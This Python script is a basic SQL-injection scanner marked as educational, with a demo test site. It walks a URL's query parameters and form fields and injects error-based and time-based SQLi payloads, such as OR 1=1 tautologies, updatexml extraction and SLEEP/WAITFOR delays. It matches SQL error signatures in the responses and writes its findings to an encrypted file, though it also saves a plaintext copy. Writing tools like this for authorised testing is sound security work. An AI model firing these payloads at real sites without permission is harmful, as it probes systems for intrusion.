#!/usr/bin/env python3

import argparse
import json
import time
import urllib.parse
from typing import Dict, List, Tuple

import requests
from bs4 import BeautifulSoup

# Symmetric encryption library (used to protect sensitive output/credentials)
from cryptography.fernet import Fernet

# test website: http://testfire.net/login.jsp
# ---------------------------
# Configuration: payload lists and detection rules
# ---------------------------
# Common error-based SQLi payloads (short examples)
ERROR_BASED_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR '1'='1' -- ",
    "') OR ('1'='1",
    "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ",
    '" and extractvalue(1,concat(0x7e,(select database()),0x7e)) -- ',
]

# Common time-based payloads: may cause delay on the DB side (depends on DBMS)
# Note: actual effectiveness depends on target DB type (MySQL, PostgreSQL, MSSQL, SQLite differ a lot)
TIME_BASED_PAYLOADS = [
    "'; SELECT pg_sleep(5); --",               # PostgreSQL
    "'; WAITFOR DELAY '0:0:5'; --",            # MSSQL
    "' OR SLEEP(5) OR '1'='1",                 # MySQL
    '" OR SLEEP(5) OR "1"="1',             # MySQL double-quote version
]

# Common SQL error fingerprints for error-based detection (not exhaustive)
SQL_ERROR_SIGS = [
    "you have an error in your sql syntax",     # MySQL
    "warning: mysql",                            # MySQL
    "unclosed quotation mark after the character string",  # MSSQL
    "quoted string not properly terminated",     # Oracle/MySQL
    "pg_query()",                                 # PostgreSQL
    "syntax error",                               # PostgreSQL
    "sqlite error",                               # SQLite
    "mysql_fetch",                                # PHP style
    "odbc",                                       # ODBC drivers
]

# Default request timeout (seconds)
DEFAULT_TIMEOUT = 12


# ---------------------------
# Helper functions
# ---------------------------
def generate_fernet_key() -> bytes:
    """
    Generate a new Fernet key (example only).
    In production, you should store the key securely (e.g., using a Key Management Service).
    Returns: key as bytes
    """
    return Fernet.generate_key()


def encrypt_bytes(key: bytes, data_bytes: bytes) -> bytes:
    f = Fernet(key)
    return f.encrypt(data_bytes)


def decrypt_bytes(key: bytes, token: bytes) -> bytes:
    f = Fernet(key)
    return f.decrypt(token)


def is_error_in_text(text: str) -> Tuple[bool, str]:
    """
    Search the response body for known SQL error fingerprints
    Returns (found, matched_signature)
    """
    lower = text.lower()
    for sig in SQL_ERROR_SIGS:
        if sig in lower:
            return True, sig
    return False, ""


def parse_query_params(url: str) -> Dict[str, List[str]]:
    """
    Parse URL query parameters, return dict param -> [values]
    """
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.parse_qs(parsed.query, keep_blank_values=True)


def build_url_with_params(base_url: str, params: Dict[str, List[str]]) -> str:
    """
    Build a URL using the given params (replace the query part)
    """
    parsed = urllib.parse.urlparse(base_url)
    new_query = urllib.parse.urlencode(
        {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in params.items()},
        doseq=False
    )
    built = urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment
    ))
    return built


# ---------------------------
# Scanning logic
# ---------------------------
class ScannerResult:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.issues = []  # list storing discovered issue dictionaries

    def add_issue(self, param: str, payload: str, evidence: str, kind: str):
        self.issues.append({
            "param": param,
            "payload": payload,
            "evidence": evidence,
            "kind": kind,
            "timestamp": time.time()
        })

    def to_json(self):
        return json.dumps({
            "target": self.target_url,
            "issues": self.issues
        }, indent=2)


class WebScanner:
    def __init__(self, base_url: str, timeout: int = DEFAULT_TIMEOUT, headers: dict = None):
        self.base_url = base_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(headers or {"User-Agent": "WebScanner/1.0 (edu-only)"})
        self.result = ScannerResult(base_url)

    def test_url_params_for_sqli(self):
        """
        If the URL contains query parameters, attempt injection for each parameter (GET)
        """
        params = parse_query_params(self.base_url)
        if not params:
            print("[*] No query parameters found in URL.")
            return

        print(f"[*] Testing query parameters: {list(params.keys())}")
        for p in params.keys():
            original_value = params[p][0] if params[p] else ""
            for payload in ERROR_BASED_PAYLOADS:
                # construct a copy of parameters with injection
                crafted = {k: v[:] for k, v in params.items()}  # shallow copy lists
                crafted[p] = [original_value + payload]
                test_url = build_url_with_params(self.base_url, crafted)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                    found, sig = is_error_in_text(resp.text)
                    if found:
                        evidence = f"Matched SQL error signature: {sig}"
                        print(f"[!] Possible error-based SQLi on param '{p}' with payload '{payload}'. Evidence: {sig}")
                        self.result.add_issue(p, payload, evidence, "error-based")
                except requests.RequestException as e:
                    print(f"[!] Request error testing {test_url}: {e}")

            # time-based tests
            for payload in TIME_BASED_PAYLOADS:
                crafted = {k: v[:] for k, v in params.items()}
                crafted[p] = [original_value + payload]
                test_url = build_url_with_params(self.base_url, crafted)
                try:
                    t0 = time.time()
                    resp = self.session.get(test_url, timeout=self.timeout + 10, allow_redirects=True)
                    t1 = time.time()
                    elapsed = t1 - t0
                    # If response time significantly exceeds threshold (e.g., >4s), suspect time-based injection
                    if elapsed >= 4.0:
                        evidence = f"Response delay {elapsed:.2f}s for payload {payload}"
                        print(f"[!] Possible time-based SQLi on param '{p}' with payload '{payload}'. Delay: {elapsed:.2f}s")
                        self.result.add_issue(p, payload, evidence, "time-based")
                except requests.Timeout:
                    # Timeout may also indicate time-based injection (or network issues), mark as suspicious
                    evidence = "Request timed out (possible time-based injection or network issue)"
                    print(f"[!] Timeout when testing time-based payload on param '{p}' (payload='{payload}').")
                    self.result.add_issue(p, payload, evidence, "time-based/timeout")
                except requests.RequestException as e:
                    print(f"[!] Request error testing {test_url}: {e}")

    def find_and_test_forms(self):
        """
        Fetch the page, parse forms, and run error-based and time-based tests for each input field.
        Note: when submitting forms here we keep other fields empty (or default), this is for demonstration only.
        """
        try:
            resp = self.session.get(self.base_url, timeout=self.timeout)
        except requests.RequestException as e:
            print(f"[!] Failed to fetch page for form parsing: {e}")
            return

        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            print("[*] No forms found on page.")
            return

        print(f"[*] Found {len(forms)} forms on page, starting tests...")
        for i, form in enumerate(forms, start=1):
            method = (form.get("method") or "get").lower()
            action = form.get("action") or self.base_url
            form_url = urllib.parse.urljoin(self.base_url, action)
            inputs = form.find_all(["input", "textarea", "select"])
            # Build a dict of fieldname -> example value (empty default)
            fields = {}
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                # ignore file types etc.
                itype = (inp.get("type") or "").lower()
                if itype == "submit" or itype == "button" or itype == "file":
                    continue
                fields[name] = "test"  # default safe value

            print(f"[*] Testing form #{i} (method={method}, action={form_url}), fields={list(fields.keys())}")

            # For each field attempt injection (error-based + time-based)
            for field in list(fields.keys()):
                orig_value = fields[field]
                for payload in ERROR_BASED_PAYLOADS:
                    data = fields.copy()
                    data[field] = orig_value + payload
                    try:
                        if method == "post":
                            r = self.session.post(form_url, data=data, timeout=self.timeout)
                        else:
                            r = self.session.get(form_url, params=data, timeout=self.timeout)
                        found, sig = is_error_in_text(r.text)
                        if found:
                            ev = f"Matched SQL error signature: {sig} (form field: {field})"
                            print(f"[!] Possible error-based SQLi in form field '{field}' with payload '{payload}'. Sig: {sig}")
                            self.result.add_issue(field, payload, ev, "error-based (form)")
                    except requests.RequestException as e:
                        print(f"[!] Request exception testing form: {e}")

                # time-based
                for payload in TIME_BASED_PAYLOADS:
                    data = fields.copy()
                    data[field] = orig_value + payload
                    try:
                        t0 = time.time()
                        if method == "post":
                            r = self.session.post(form_url, data=data, timeout=self.timeout + 10)
                        else:
                            r = self.session.get(form_url, params=data, timeout=self.timeout + 10)
                        elapsed = time.time() - t0
                        if elapsed >= 4.0:
                            ev = f"Response delay {elapsed:.2f}s (form field {field})"
                            print(f"[!] Possible time-based SQLi in form field '{field}' with payload '{payload}'. Delay: {elapsed:.2f}s")
                            self.result.add_issue(field, payload, ev, "time-based (form)")
                    except requests.Timeout:
                        ev = "Request timed out (possible time-based injection or network issue)"
                        print(f"[!] Timeout testing time-based payload on form field '{field}'.")
                        self.result.add_issue(field, payload, ev, "time-based/timeout (form)")
                    except requests.RequestException as e:
                        print(f"[!] Request exception testing form time-based: {e}")

    def run_all_tests(self, find_forms: bool = True):
        """
        Run all tests: try URL parameter injection first, then page forms (if enabled).
        """
        print("[*] Starting tests on:", self.base_url)
        self.test_url_params_for_sqli()
        if find_forms:
            self.find_and_test_forms()
        print("[*] Tests complete.")


# ---------------------------
# Main function and CLI
# ---------------------------
def main():
    parser = argparse.ArgumentParser(description="Simple Web Vulnerability Scanner (education only)")
    parser.add_argument("--url", required=True, help="Target URL (may include query parameters)")
    parser.add_argument("--find-forms", action="store_true", help="Parse page and test forms")
    parser.add_argument("--output", default="scan_results.enc", help="Encrypted output file for results")
    parser.add_argument("--key-out", default="fernet.key", help="Where to save generated Fernet key (keep safe)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout seconds")
    args = parser.parse_args()

    # Generate or load symmetric key (here we generate and save to file, watch permissions)
    key = generate_fernet_key()
    with open(args.key_out, "wb") as f:
        f.write(key)
    print(f"[*] Generated Fernet key and saved to {args.key_out}. Keep it safe!")

    scanner = WebScanner(args.url, timeout=args.timeout)

    # Run tests
    scanner.run_all_tests(find_forms=args.find_forms)

    # Serialize results and encrypt save
    json_bytes = scanner.result.to_json().encode("utf-8")
    enc = encrypt_bytes(key, json_bytes)
    with open(args.output, "wb") as f:
        f.write(enc)
    with open(args.output + ".org", "wb") as f:
        f.write(decrypt_bytes(key, enc))
    print(f"[*] Encrypted scan results saved to {args.output}")

    # If no issues found, output a notice
    if not scanner.result.issues:
        print("[*] No obvious issues detected by this basic scanner.")
    else:
        print(f"[!] Found {len(scanner.result.issues)} potential issues. Decrypt results with the saved key to review details.")


if __name__ == "__main__":
    main()
